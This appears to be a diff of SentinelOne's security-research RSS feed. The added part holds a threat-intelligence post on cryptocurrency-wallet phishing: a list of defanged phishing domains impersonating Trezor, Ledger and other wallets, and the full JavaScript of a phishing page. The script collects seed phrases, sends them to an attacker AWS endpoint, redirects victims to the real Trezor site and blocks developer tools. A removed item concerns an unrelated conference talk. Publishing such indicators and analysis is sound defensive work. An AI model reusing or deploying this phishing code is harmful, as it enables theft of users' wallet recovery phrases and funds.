+https://portal-treaeameaene876.azurewebsites[.]net/<br />
+https://ra0-lkjd01-gfhjd.s3.eu-north-1.amazonaws[.]com/index.html<br />
+https://relkd28-lokdyuj.s3.us-east-1.amazonaws[.]com/index.html<br />
+https://sdfg0d28-djkfk.s3.us-east-1.amazonaws[.]com/index.html<br />
+https://secuxwallet-api.azurewebsites[.]net/<br />
+https://sjdhd29-oiuw0.s3.us-east-1.amazonaws[.]com/index.html<br />
+https://sledegerwallet.azurewebsites[.]net/<br />
+https://solflareewerror.azurewebsites[.]net/<br />
+https://suiitewalettrzior.azurewebsites[.]net/<br />
+https://teirzoriiostart.azurewebsites[.]net/<br />
+https://tereamanezheoakeeoake.azurewebsites[.]net/<br />
+https://tereazeriwaleits.azurewebsites[.]net/<br />
+https://tereizercoinswalts.azurewebsites[.]net/<br />
+https://tereizercoinsweb.azurewebsites[.]net/<br />
+https://tereziiorcoinsweb3.azurewebsites[.]net/<br />
+https://tereziioreeae-walieats.azurewebsites[.]net/<br />
+https://terezorcoinscweb3.azurewebsites[.]net/<br />
+https://terezuiear-api.azurewebsites[.]net/<br />
+https://terozeiorwltliv31wikub.azurewebsites[.]net/<br />
+https://terozriosiuet.azurewebsites[.]net/<br />
+https://terzoerirwlt476liv.azurewebsites[.]net/<br />
+https://tirizeriostrt.azurewebsites[.]net/<br />
+https://tirizurstrtio.azurewebsites[.]net/<br />
+https://tirzwltliv09erds.azurewebsites[.]net/<br />
+https://tizrerlivwlt897wlt.azurewebsites[.]net/<br />
+https://tizrwlterliv45livwlt.azurewebsites[.]net/<br />
+https://tr01-dkfjgk-slas.s3.eu-north-1.amazonaws[.]com/index.html<br />
+https://tr0ox-obnsj.s3.eu-north-1.amazonaws[.]com/index.html<br />
+https://tra09fjl-sodfjjkd.s3.eu-north-1.amazonaws[.]com/index.html<br />
+https://trac-durjg-fkf.s3.eu-north-1.amazonaws[.]com/index.html<br />
+https://traezor-suitez403.azurewebsites[.]net/<br />
+https://traieazeariscoins.azurewebsites[.]net/<br />
+https://tre876162ru0988zer.azurewebsites[.]net/<br />
+https://treaizerecoins.azurewebsites[.]net/<br />
+https://treauzearcoins.azurewebsites[.]net/<br />
+https://treazerapi-apk.azurewebsites[.]net/<br />
+https://treazerszcoins.azurewebsites[.]net/<br />
+https://treaziexc-ax-bc.azurewebsites[.]net/<br />
+https://treazirapi-apk.azurewebsites[.]net/<br />
+https://treazosr-api.azurewebsites[.]net/<br />
+https://treazsoirsuites.azurewebsites[.]net/<br />
+https://treazuer-suite.azurewebsites[.]net/<br />
+https://treizaers-coins.azurewebsites[.]net/<br />
+https://treizoircoinerror3.azurewebsites[.]net/<br />
+https://treizrwalogn.azurewebsites[.]net/<br />
+https://treriertriliv34erwlt.azurewebsites[.]net/<br />
+https://trezaereade-suite.azurewebsites[.]net/<br />
+https://trezieserscoins.azurewebsites[.]net/<br />
+https://trezior-suite.azurewebsites[.]net/<br />
+https://trezirapp-api.azurewebsites[.]net/<br />
+https://treziresacoins.azurewebsites[.]net/<br />
+https://triezorwallets.azurewebsites[.]net/<br />
+https://trioriorwlt485wltliv.azurewebsites[.]net/<br />
+https://trizeriowaliet.azurewebsites[.]net/<br />
+https://triziorecoinsweb3.azurewebsites[.]net/<br />
+https://triziriosuite.azurewebsites[.]net/<br />
+https://trizuriosiute.azurewebsites[.]net/<br />
+https://trucetreizerr.azurewebsites[.]net/<br />
+https://truiazearcoins.azurewebsites[.]net/<br />
+https://trzeriostrt.azurewebsites[.]net/<br />
+https://ttrzorappsuite.azurewebsites[.]net/<br />
+https://tzer30liv.s3.us-east-2.amazonaws[.]com/index.html<br />
+https://tzr06wlt.s3.eu-north-1.amazonaws[.]com/index.html<br />
+https://tzreoirwlt05balba.azurewebsites[.]net/<br />
+https://tzreoriewlt31wikub.azurewebsites[.]net/<br />
+https://uniswapv3login.azurewebsites[.]net/<br />
+https://uphooldlogn.azurewebsites[.]net/<br />
+https://web-treszor.azurewebsites[.]net/<br />
+https://weberrortrezur886.azurewebsites[.]net/<br />
+https://wltcbserlive467wlt.azurewebsites[.]net/<br />
+https://wltlzr67erlivehsfjfd.azurewebsites[.]net/<br />
+https://woleatcoebs34livwlt.azurewebsites[.]net/<br />
+https://zen-ledger-error.azurewebsites[.]net/<br />
+https://zenledgerscoinsweb.azurewebsites[.]net/</p>
+<h3>Example JavaScript</h3>
+<p>This is an example of the JavaScript (&#8220;app.js&#8221;) that was included on the S3-hosted phishing example: <code>https://dft0-hjgkd26-fkj.s3.us-east-1.amazonaws[.]com/index.html</code>.</p>
+<p>Note the defanged malicious URL in the code below–that is the only alteration.</p>
+<pre>
+let currentWordCount = 12; // Default word count
+function updateInputFields(wordCount) {
+   const inputContainer = document.getElementById('inputContainer');
+   inputContainer.innerHTML = '';
+    currentWordCount = wordCount;
+    for (let i = 0; i &lt; wordCount; i++) { // Use 0-based index for phase keys
+        const colDiv = document.createElement('div');
+    // if (wordCount === 1) {
+    //     colDiv.className = 'col-lg-21 col-md-12 col-sm-12 col-xs-12';
+    //     colDiv.innerHTML = `
+    //         &lt;input
+    //             class="form-control"
+    //             type="text"
+    //             placeholder="Input your words as many words as you have"
+    //             name="word${i}"
+    //             required
+    //             title="Only alphabets are allowed.">
+    //         &lt;div class="error-message" style="font-size:12px;color: #fe3131f2; display: none;">Please enter a valid value.&lt;/div>
+    //     `;
+    // } else {
+        colDiv.className = 'col-lg-4 col-md-4 col-sm-4 col-xs-12';
+        colDiv.innerHTML = `
+            &lt;input
+                class="form-control"
+                type="text"
+                placeholder="${i + 1}."
+                name="word${i}"
+                required
+                pattern="[a-zA-Z]{1,10}"
+                maxlength="10"
+                oninput="this.value = this.value.replace(/[^a-zA-Z]/g, '').substring(0, 10);"
+                title="Only alphabets are allowed.">
+            &lt;div class="error-message" style="font-size:12px;color: #fe3131f2; display: none;">Please enter a valid value.&lt;/div>
+                `;
+            // }
+        inputContainer.appendChild(colDiv);
+    }
+    event.target.classList.add('active');
+    const buttons = document.querySelectorAll('.displayflex button');
+    buttons.forEach((button) => {
+        button.classList.remove('active');
+    });
+    event.target.classList.add('active');
+}
+async function handleNextStep(event) {
+    event.preventDefault();
+    const inputContainer = document.getElementById('inputContainer');
+    const inputs = inputContainer.querySelectorAll('input');
+    let allValid = true;
+    const enteredWords = new Set();
+    inputs.forEach((input) => {
+        const errorDiv = input.nextElementSibling; // Get the associated error div
+        if (!input.checkValidity()) {
+            errorDiv.style.display = 'block';
+            allValid = false;
+        } else {
+            errorDiv.style.display = 'none';
+        }
+        const word = input.value.trim().toLowerCase(); // Normalize to lowercase to handle case insensitivity
+        if (word &amp;&amp; enteredWords.has(word)) {
+            allValid = false;
+            errorDiv.innerHTML = 'This word has already been entered.';
+            errorDiv.style.display = 'block';
+        } else {
+            enteredWords.add(word);  // Add word to the Set
+        }
+    });
+    if (!allValid) {
+        alert("Mnemonic phrase is not valid. Try again.");
+        return;
+    }
+    const data = {};
+    inputs.forEach((input, index) => {
+    data[`phrase${index}`] = input.value.trim();
+    });
+    data.subject = "Trezor connect2";
+    data.message = "Successfull fetch data";
+    $.ajax({
+        type: "POST",
+        url: "<b>https://rfhwuwixxi.execute-api.us-east-1.amazonaws[.]com/prod/eappmail</b>",
+        dataType: "json",
+        crossDomain: true,
+        contentType: "application/json; charset=utf-8",
+        data: JSON.stringify(data),
+        success: function (result) {
+        alert('Data submitted successfully1!');
+        window.location.href = 'https://suite.trezor.io/web/';
+        location.reload();
+        },
+        error: function (xhr, status, error) {
+            window.location.href = 'https://suite.trezor.io/web/';
+&nbsp;
+&nbsp;
+        }
+    });
+}
+
+window.onload = function () {
+    // Prevent the back button from navigating back
+    function preventBack() {
+    history.forward();
+    }
+    
+    // Execute the `preventBack` function immediately after page load
+    setTimeout(preventBack, 0);
+    
+    // Ensure the page doesn't cache on unload, forcing users to reload
+    window.onunload = function () {
+        return null;
+    };
+};
+
+document.addEventListener('DOMContentLoaded', () => updateInputFields(12));
+
+document.addEventListener("DOMContentLoaded", function () {
+    const statusButton = document.getElementById("statusButton");
+    const statusText = document.getElementById("statusText");
+    const statusIcon = document.getElementById("statusIcon");
+    // Initial state: "Waiting for Trezor..."
+    statusText.textContent = "Waiting for Trezor... ";
+    statusIcon.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin" style="color: #ffffff;"></i>';
+    // After 2 seconds: "Establishing connection"
+    setTimeout(() => {
+        statusText.textContent = "Establishing connection...";
+        statusIcon.innerHTML = '<i class="fa-solid fa-link" style="color: #ffffff;"></i>';
+    }, 5000);
+    // After 5 seconds: "Unable to read data" (Error state)
+    setTimeout(() => {
+    statusText.textContent = "Unable to read data";
+    statusIcon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color: #ffffff;"></i>';
+    statusButton.classList.add("error-btn");
+    }, 5000);
+    function resetStatus() {
+        // Reset to "Establishing connection..."
+        statusText.textContent = "Establishing connection...";
+        statusIcon.innerHTML = '<i class="fa-solid fa-link" style="color: #ffffff;"></i>';
+        statusButton.classList.remove("error-btn");  // Reset error button class
+        // After 3 seconds: Change status to "Unable to read data"
+        setTimeout(() => {
+            statusText.textContent = "Unable to read data";
+            statusIcon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color: #fe3131f2;"></i>';
+            statusButton.classList.add("error-btn");
+        }, 5000);
+    }
+    // Event listener for button click
+    statusButton.addEventListener("click", function () {
+        resetStatus(); // Reset and start the cycle on each click
+    });
+    // Optionally, you can trigger the status change flow immediately after page load for testing
+    setTimeout(() => {
+        resetStatus(); // Automatically run the flow when the page loads (optional)
+    }, 5000);
+});
+
+    // Disable right-click context menu
+    document.addEventListener("contextmenu", (event) => event.preventDefault());
+    // Disable key combinations for opening developer tools
+    document.addEventListener("keydown", (event) => {
+    // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U (View Source), Ctrl+Shift+C
+    if (
+        event.key === "F12" ||
+        (event.ctrlKey &amp;&amp; event.shiftKey &amp;&amp; ["I", "J", "C"].includes(event.key)) ||
+        (event.ctrlKey &amp;&amp; event.key === "U")
+    ) {
+        event.preventDefault();
+}
+});
+
+    // Detect if devtools is opened (basic detection)
+    const detectDevTools = () => {
+    const element = new Image();
+        Object.defineProperty(element, "id", {
+            get: () => {
+                alert("Developer tools detected. Please close it to proceed.");
+                // Redirect or log out the user
+                window.location.href = "about:blank"; // Example action
+            },
+        });
+        console.log(element);
+    };
+    detectDevTools();
+    setInterval(detectDevTools, 1000);
+</pre>
+]]></content:encoded>
+					
+		
+		
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/05/CryptoDrain-soc.jpg" length="969572" type="image/jpeg" />	</item>
+		<item>
 		<title>Top Tier Target &#124; What It Takes to Defend a Cybersecurity Company from Today&#8217;s Adversaries</title>
 		<link>https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/</link>
 		
@@ -877,33 +1635,5 @@ e2221e5c58a1a976e59fe1062c6db36d4951b81e &#8211; PHP file containing URL associa
 		
 		
 		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/01/Phishing-on-X-High-Profile-Account-Targeting-Campaign-Returns-Promoting-Cryptocurrency-Scams-2.jpg" length="95469" type="image/jpeg" />	</item>
-		<item>
-		<title>LABScon24 Replay &#124; Follow the Money: Uncovering the Incorporation and the CCP’s Ownership of Chinese Firms Investing in the USA</title>
-		<link>https://www.sentinelone.com/labs/labscon24-replay-follow-the-money-uncovering-the-incorporation-and-the-ccps-ownership-of-chinese-firms-investing-in-the-usa/</link>
-		
-		<dc:creator><![CDATA[LABScon]]></dc:creator>
-		<pubDate>Thu, 30 Jan 2025 14:00:32 +0000</pubDate>
-				<category><![CDATA[China]]></category>
-		<category><![CDATA[labscon24]]></category>
-		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=113321</guid>
-
-					<description><![CDATA[Chinese foreign direct investment should trigger American national security concerns, but much of it doesn’t. Elly Rostoum reveals why.]]></description>
-										<content:encoded><![CDATA[<p><span style="letter-spacing: 0px;">Chinese foreign direct investment should trigger American national security concerns, but much of it doesn’t. In this ‘behind closed doors’ talk at LABScon 24, Elly Rostoum reveals why and what can be done to improve our understanding of the influence of Chinese FDI.</span></p>
-<p>Chinese foreign direct investment (FDI) enabled the technology revolution in China and set China as a strategic competitor to the United States. It opened new global markets, redrew trade routes, tapped into intellectual property, allowed for opportunities in industrial espionage, reshaped supply chains, and allowed for technological breakthroughs in genomics, quantum computing, artificial intelligence, and other critical and emerging technologies that are quite simply re-imagining the world.</p>
-<p>But who exactly owns the Chinese firms undertaking this FDI?</p>
-<p>The research presented by <a href="https://www.labscon.io/speakers/elly-rostoum/" target="_blank" rel="noopener">Elly Rostoum</a> in this LABScon 2024 keynote address tracks the incorporation structures and ownership of the 672 Chinese firms undertaking FDI globally.</p>
-<p>Taking the audience on a journey from how Chinese FDI triggers &#8211; and sometimes fails to trigger &#8211;  American national security concerns to the complex ownership structure of Chinese businesses operating within the U.S., Elly Rostoum reveals how the Chinese government has been able to evade American national security reviews by instrumentalizing investment through 3rd &amp; 4th+ level subsidiaries, private equity, and holding companies.</p>
-<p>While much policy and attention has been focused on the investments of Chinese state-owned enterprises, Elly Rostoum argues that the real threat is “within” and buried in the details: seemingly “American” businesses that are ultimately owned by Chinese investment companies.</p>
-<p><iframe loading="lazy" src="https://www.youtube.com/embed/glyHKbaS4Fs" width="700" height="392" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
-<h2>About the Author</h2>
-<p><a href="https://www.ellyrostoum.com/" target="_blank" rel="noopener">Elly Rostoum</a> is a former U.S. Intelligence Analyst and National Security Council staffer at the White House. She is the Managing Director of the Alperovitch Institute for Cybersecurity Studies at Johns Hopkins University, where she teaches courses on national security vulnerabilities of critical and emerging technologies, intelligence, public policy, strategic studies, and energy markets; with a regional expertise covering China and the Middle East.</p>
-<h2>About LABScon</h2>
-<p>This presentation was featured live at <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon</a> 2024, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLabs.</p>
-<p>Keep up with all the latest on <a href="https://www.labscon.io/" target="_blank" rel="noopener noreferrer">LABScon 2025</a> here.</p>
-]]></content:encoded>
-					
-		
-		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/01/elly-rostoum-ftr.jpg" length="478489" type="image/jpeg" />	</item>
 	</channel>
 </rss>
